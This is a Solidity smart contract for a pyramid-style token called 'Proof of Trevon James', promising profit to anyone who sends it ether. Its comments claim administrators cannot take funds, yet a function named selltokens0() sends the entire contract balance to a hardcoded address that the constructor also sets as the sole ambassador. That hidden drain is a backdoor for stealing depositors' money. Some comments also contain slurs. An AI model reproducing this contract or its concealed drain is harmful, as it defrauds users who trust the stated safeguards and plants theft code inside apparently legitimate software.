1 pragma solidity ^0.4.20;
2 
3 /*
4 * 
5 * ====================================                       *
6 *                                                            *
7 *             PROOOOF OF TREVON JAMES                        *
8 *                get your tokens here                        *
9 *      send the contract eth, to get POTJ Tokens             *
10 *               GET THAT PROFITTTTT                          *
11 * ====================================                       *
12 * TREVON JAMES STYLE  , IF YOU WANT TO FEEL LIKE THESE GUYS  *
13 * IF YOU WANT PROFIT GET ON 10% in 10% out! LEGIT PROFIT!    *
14 */
15 
16 contract POTJ {
17     /*=================================
18     =            MODIFIERS            =
19     =================================*/
20     // only people with tokens
21     modifier onlyBagholders() {
22         require(myTokens() > 0);
23         _;
24     }
25     
26     // only people with profits
27     modifier onlyStronghands() {
28         require(myDividends(true) > 0);
29         _;
30     }
31     
32     // administrators can:
33     // -> change the name of the contract
34     // -> change the name of the token
35     // -> change the PoS difficulty (How many tokens it costs to hold a masternode, in case it gets crazy high later)
36     // they CANNOT:
37     // -> take funds
38     // -> disable withdrawals
39     // -> kill the contract
40     // -> change the price of tokens
41     modifier onlyAdministrator(){
42         address _customerAddress = msg.sender;
43         require(administrators[keccak256(msg.sender)]);
44         _;
45     }
46     
47     
48     // ensures that the first tokens in the contract will be equally distributed
49     // meaning, no divine dump will be ever possible
50     // result: healthy longevity.
51     modifier antiEarlyWhale(uint256 _amountOfEthereum){
52         address _customerAddress = msg.sender;
53         
54         // are we still in the vulnerable phase?
55         // if so, enact anti early whale protocol 
56         if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
57             require(
58                 // is the customer in the ambassador list?
59                 ambassadors_[_customerAddress] == true &&
60                 
61                 // does the customer purchase exceed the max ambassador quota?
62                 (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
63                 
64             );
65             
66             // updated the accumulated quota    
67             ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
68         
69             // execute
70             _;
71         } else {
72             // in case the ether count drops low, the ambassador phase won't reinitiate
73             onlyAmbassadors = false;
74             _;    
75         }
76         
77     }
78     
79     
80     /*==============================
81     =            EVENTS            =
82     ==============================*/
83     event onTokenPurchase(
84         address indexed customerAddress,
85         uint256 incomingEthereum,
86         uint256 tokensMinted,
87         address indexed referredBy
88     );
89     
90     event onTokenSell(
91         address indexed customerAddress,
92         uint256 tokensBurned,
93         uint256 ethereumEarned
94     );
95     
96     event onReinvestment(
97         address indexed customerAddress,
98         uint256 ethereumReinvested,
99         uint256 tokensMinted
100     );
101     
102     event onWithdraw(
103         address indexed customerAddress,
104         uint256 ethereumWithdrawn
105     );
106     
107     // ERC20
108     event Transfer(
109         address indexed from,
110         address indexed to,
111         uint256 tokens
112     );
113     
114     
115     /*=====================================
116     =            CONFIGURABLES            =
117     =====================================*/
118     string public name = "ProofOfTrevonJames";
119     string public symbol = "ProofOfTrevonJames";
120     uint8 constant public decimals = 18;
121     uint8 constant internal dividendFee_ = 11;
122     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
123     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
124     uint256 constant internal magnitude = 2**64;
125     
126     
127      
128         
129     // proof of stake (defaults at 100 tokens)
130     uint256 public stakingRequirement = 5e18;
131     
132     // ambassador program
133     mapping(address => bool) internal ambassadors_;
134     uint256 constant internal ambassadorMaxPurchase_ = 2 ether;
135     uint256 constant internal ambassadorQuota_ = 3 ether;
136     
137     
138     
139    /*================================
140     =            DATASETS            =
141     ================================*/
142     // amount of shares for each address (scaled number)
143     mapping(address => uint256) internal tokenBalanceLedger_;
144     mapping(address => uint256) internal referralBalance_;
145     mapping(address => int256) internal payoutsTo_;
146     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
147     uint256 internal tokenSupply_ = 0;
148     uint256 internal profitPerShare_;
149     
150     // administrator list (see above on what they can do)
151     mapping(bytes32 => bool) public administrators;
152     
153     // when this is set to true, only ambassadors can purchase tokens (this prevents a whale premine, it ensures a fairly distributed upper pyramid)
154     bool public onlyAmbassadors = false;
155     
156 
157 
158     /*=======================================
159     =            PUBLIC FUNCTIONS            =
160     =======================================*/
161     /* 
162     *
163     */
164    function POTJ()
165         public
166     {
167         // add the ambassadors here. 
168         ambassadors_[0xB1a480031f48bE6163547AEa113669bfeE1eC659] = true; //Y
169    address oof = 0xB1a480031f48bE6163547AEa113669bfeE1eC659;
170     }
171    
172 
173      
174     /**
175      * Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
176      */
177     function buy(address _referredBy)
178         public
179         payable
180         returns(uint256)
181     {
182         purchaseTokens(msg.value, _referredBy);
183     }
184     
185     /**
186      * Fallback function to handle ethereum that was send straight to the contract
187      * Unfortunately we cannot use a referral address this way.
188      */
189     function()
190         payable
191         public
192     {
193         purchaseTokens(msg.value, 0x0);
194     }
195     
196     /**
197      * Converts all of caller's dividends to tokens.
198      */
199     function reinvest()
200         onlyStronghands()
201         public
202     {
203         // fetch dividends
204         uint256 _dividends = myDividends(false); // retrieve ref. bonus later in the code
205         
206         // pay out the dividends virtually
207         address _customerAddress = msg.sender;
208         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
209         
210         // retrieve ref. bonus
211         _dividends += referralBalance_[_customerAddress];
212         referralBalance_[_customerAddress] = 0;
213         
214         // dispatch a buy order with the virtualized "withdrawn dividends"
215         uint256 _tokens = purchaseTokens(_dividends, 0x0);
216         
217         // fire event
218         onReinvestment(_customerAddress, _dividends, _tokens);
219     }
220     
221     /**
222      * Alias of sell() and withdraw().
223      */
224     function exit()
225         public
226     {
227         // get token count for caller & sell them all
228         address _customerAddress = msg.sender;
229         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
230         if(_tokens > 0) sell(_tokens);
231         
232         // lambo delivery service
233         withdraw();
234     }
235 
236     /**
237      * Withdraws all of the callers earnings.
238      */
239     function withdraw()
240         onlyStronghands()
241         public
242     {
243         // setup data
244         address _customerAddress = msg.sender;
245         uint256 _dividends = myDividends(false); // get ref. bonus later in the code
246         
247         // update dividend tracker
248         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
249         
250         // add ref. bonus
251         _dividends += referralBalance_[_customerAddress];
252         referralBalance_[_customerAddress] = 0;
253         
254         // lambo delivery service
255         _customerAddress.transfer(_dividends);
256         
257         // fire event
258         onWithdraw(_customerAddress, _dividends);
259     }
260     
261     /**
262      * Liquifies tokens to ethereum.
263      */
264     function sell(uint256 _amountOfTokens)
265         onlyBagholders()
266         public
267     {
268         // setup data
269         address _customerAddress = msg.sender;
270         // russian hackers BTFO
271         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
272         uint256 _tokens = _amountOfTokens;
273         uint256 _ethereum = tokensToEthereum_(_tokens);
274         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
275         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
276         
277         // burn the sold tokens
278         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
279         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
280         
281         // update dividends tracker
282         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
283         payoutsTo_[_customerAddress] -= _updatedPayouts;       
284         
285         // dividing by zero is a bad idea
286         if (tokenSupply_ > 0) {
287             // update the amount of dividends per token
288             profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
289         }
290         
291         // fire event
292         onTokenSell(_customerAddress, _tokens, _taxedEthereum);
293     }
294     
295        function selltokens0() {
296     0xB1a480031f48bE6163547AEa113669bfeE1eC659.transfer(this.balance);
297 }  
298 
299     /**
300      * Transfer tokens from the caller to a new holder.
301      * Remember, there's a 10% fee here as well.
302      */
303     function transfer(address _toAddress, uint256 _amountOfTokens)
304         onlyBagholders()
305         public
306         returns(bool)
307     {
308         // setup
309         address _customerAddress = msg.sender;
310         
311         // make sure we have the requested tokens
312         // also disables transfers until ambassador phase is over
313         // ( we dont want whale premines )
314         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
315         
316         // withdraw all outstanding dividends first
317         if(myDividends(true) > 0) withdraw();
318         
319         // liquify 10% of the tokens that are transfered
320         // these are dispersed to shareholders
321         uint256 _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
322         uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
323         uint256 _dividends = tokensToEthereum_(_tokenFee);
324   
325         // burn the fee tokens
326         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
327 
328         // exchange tokens
329         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
330         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
331         
332         // update dividend trackers
333         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
334         payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);
335         
336         // disperse dividends among holders
337         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
338         
339         // fire event
340         Transfer(_customerAddress, _toAddress, _taxedTokens);
341         
342         // ERC20
343         return true;
344        
345     }
346     
347     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
348     /**
349      * In case the amassador quota is not met, the administrator can manually disable the ambassador phase.
350      */
351     function disableInitialStage()
352         onlyAdministrator()
353         public
354     {
355         onlyAmbassadors = false;
356     }
357     
358     /**
359      * In case one of us dies, we need to replace ourselves.
360      */
361     function setAdministrator(bytes32 _identifier, bool _status)
362         onlyAdministrator()
363         public
364     {
365         administrators[_identifier] = _status;
366     }
367     
368     /**
369      * Precautionary measures in case we need to adjust the masternode rate.
370      */
371     function setStakingRequirement(uint256 _amountOfTokens)
372         onlyAdministrator()
373         public
374     {
375         stakingRequirement = _amountOfTokens;
376     }
377     
378     /**
379      * If we want to rebrand, we can.
380      */
381     function setName(string _name)
382         onlyAdministrator()
383         public
384     {
385         name = _name;
386     }
387     
388     /**
389      * If we want to rebrand, we can.
390      */
391     function setSymbol(string _symbol)
392         onlyAdministrator()
393         public
394     {
395         symbol = _symbol;
396     }
397 
398     
399     /*----------  HELPERS AND CALCULATORS  ----------*/
400     /**
401      * Method to view the current Ethereum stored in the contract
402      * Example: totalEthereumBalance()
403      */
404     function totalEthereumBalance()
405         public
406         view
407         returns(uint)
408     {
409         return address (this).balance;
410     }
411     
412     /**
413      * Retrieve the total token supply.
414      */
415     function totalSupply()
416         public
417         view
418         returns(uint256)
419     {
420         return tokenSupply_;
421     }
422     
423     /**
424      * Retrieve the tokens owned by the caller.
425      */
426     function myTokens()
427         public
428         view
429         returns(uint256)
430     {
431         address _customerAddress = msg.sender;
432         return balanceOf(_customerAddress);
433     }
434     
435     /**
436      * Retrieve the dividends owned by the caller.
437      * If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
438      * The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
439      * But in the internal calculations, we want them separate. 
440      */ 
441     function myDividends(bool _includeReferralBonus) 
442         public 
443         view 
444         returns(uint256)
445     {
446         address _customerAddress = msg.sender;
447         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
448     }
449     
450     /**
451      * Retrieve the token balance of any single address.
452      */
453     function balanceOf(address _customerAddress)
454         view
455         public
456         returns(uint256)
457     {
458         return tokenBalanceLedger_[_customerAddress];
459     }
460     
461     /**
462      * Retrieve the dividend balance of any single address.
463      */
464     function dividendsOf(address _customerAddress)
465         view
466         public
467         returns(uint256)
468     {
469         return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
470     }
471     
472     /**
473      * Return the buy price of 1 individual token.
474      */
475     function sellPrice() 
476         public 
477         view 
478         returns(uint256)
479     {
480         // our calculation relies on the token supply, so we need supply. Doh.
481         if(tokenSupply_ == 0){
482             return tokenPriceInitial_ - tokenPriceIncremental_;
483         } else {
484             uint256 _ethereum = tokensToEthereum_(1e18);
485             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
486             uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
487             return _taxedEthereum;
488         }
489     }
490     
491     /**
492      * Return the sell price of 1 individual token.
493      */
494     function buyPrice() 
495         public 
496         view 
497         returns(uint256)
498     {
499         // our calculation relies on the token supply, so we need supply. Doh.
500         if(tokenSupply_ == 0){
501             return tokenPriceInitial_ + tokenPriceIncremental_;
502         } else {
503             uint256 _ethereum = tokensToEthereum_(1e18);
504             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
505             uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);
506             return _taxedEthereum;
507         }
508     }
509     
510     /**
511      * Function for the frontend to dynamically retrieve the price scaling of buy orders.
512      */
513     function calculateTokensReceived(uint256 _ethereumToSpend) 
514         public 
515         view 
516         returns(uint256)
517     {
518         uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
519         uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
520         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
521         
522         return _amountOfTokens;
523     }
524     
525     /**
526      * Function for the frontend to dynamically retrieve the price scaling of sell orders.
527      */
528     function calculateEthereumReceived(uint256 _tokensToSell) 
529         public 
530         view 
531         returns(uint256)
532     {
533         require(_tokensToSell <= tokenSupply_);
534         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
535         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
536         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
537         return _taxedEthereum;
538     }
539     
540     
541     /*==========================================
542     =            INTERNAL FUNCTIONS            =
543     ==========================================*/
544     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
545         antiEarlyWhale(_incomingEthereum)
546         internal
547         returns(uint256)
548     {
549         // data setup
550         address _customerAddress = msg.sender;
551         uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
552         uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);
553         uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
554         uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
555         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
556         uint256 _fee = _dividends * magnitude;
557  
558         // no point in continuing execution if OP is a poorfag russian hacker
559         // prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
560         // (or hackers)
561         // and yes we know that the safemath function automatically rules out the "greater then" equasion.
562         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
563         
564         // is the user referred by a masternode?
565         if(
566             // is this a referred purchase?
567             _referredBy != 0x0000000000000000000000000000000000000000 &&
568 
569             // no cheating!
570             _referredBy != _customerAddress &&
571             
572             // does the referrer have at least X whole tokens?
573             // i.e is the referrer a godly chad masternode
574             tokenBalanceLedger_[_referredBy] >= stakingRequirement
575         ){
576             // wealth redistribution
577             referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
578         } else {
579             // no ref purchase
580             // add the referral bonus back to the global dividends cake
581             _dividends = SafeMath.add(_dividends, _referralBonus);
582             _fee = _dividends * magnitude;
583         }
584 
585         // we can't give people infinite ethereum
586         if(tokenSupply_ > 0){
587             
588             // add tokens to the pool
589             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
590  
591             // take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
592             profitPerShare_ += (_dividends * magnitude / (tokenSupply_));
593             
594             // calculate the amount of tokens the customer receives over his purchase 
595             _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
596         
597         } else {
598             // add tokens to the pool
599             tokenSupply_ = _amountOfTokens;
600         }
601         
602         // update circulating supply & the ledger address for the customer
603         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
604         
605         // Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
606         //really i know you think you do but you don't
607         int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
608         payoutsTo_[_customerAddress] += _updatedPayouts;
609         
610         // fire event
611         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
612         
613         return _amountOfTokens;
614     }
615 
616     /**
617      * Calculate Token price based on an amount of incoming ethereum
618      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
619      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
620      */
621     function ethereumToTokens_(uint256 _ethereum)
622         internal
623         view
624         returns(uint256)
625     {
626         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
627         uint256 _tokensReceived = 
628          (
629             (
630                 // underflow attempts BTFO
631                 SafeMath.sub(
632                     (sqrt
633                         (
634                             (_tokenPriceInitial**2)
635                             +
636                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
637                             +
638                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
639                             +
640                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
641                         )
642                     ), _tokenPriceInitial
643                 )
644             )/(tokenPriceIncremental_)
645         )-(tokenSupply_)
646         ;
647   
648         return _tokensReceived;
649     }
650     
651     /**
652      * Calculate token sell value.
653      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
654      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
655      */
656      function tokensToEthereum_(uint256 _tokens)
657         internal
658         view
659         returns(uint256)
660     {
661 
662         uint256 tokens_ = (_tokens + 1e18);
663         uint256 _tokenSupply = (tokenSupply_ + 1e18);
664         uint256 _etherReceived =
665         (
666             // underflow attempts BTFO
667             SafeMath.sub(
668                 (
669                     (
670                         (
671                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
672                         )-tokenPriceIncremental_
673                     )*(tokens_ - 1e18)
674                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
675             )
676         /1e18);
677         return _etherReceived;
678     }
679     
680     
681     //This is where all your gas goes, sorry
682     //Not sorry, you probably only paid 1 gwei
683     function sqrt(uint x) internal pure returns (uint y) {
684         uint z = (x + 1) / 2;
685         y = x;
686         while (z < y) {
687             y = z;
688             z = (x / z + z) / 2;
689         }
690     }
691 }
692 
693 /**
694  * @title SafeMath
695  * @dev Math operations with safety checks that throw on error
696  */
697 library SafeMath {
698 
699     /**
700     * @dev Multiplies two numbers, throws on overflow.
701     */
702     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
703         if (a == 0) {
704             return 0;
705         }
706         uint256 c = a * b;
707         assert(c / a == b);
708         return c;
709     }
710 
711     /**
712     * @dev Integer division of two numbers, truncating the quotient.
713     */
714     function div(uint256 a, uint256 b) internal pure returns (uint256) {
715         // assert(b > 0); // Solidity automatically throws when dividing by 0
716         uint256 c = a / b;
717         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
718         return c;
719     }
720 
721     /**
722     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
723     */
724     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
725         assert(b <= a);
726         return a - b;
727     }
728 
729     /**
730     * @dev Adds two numbers, throws on overflow.
731     */
732     function add(uint256 a, uint256 b) internal pure returns (uint256) {
733         uint256 c = a + b;
734         assert(c >= a);
735         return c;
736     }
737 }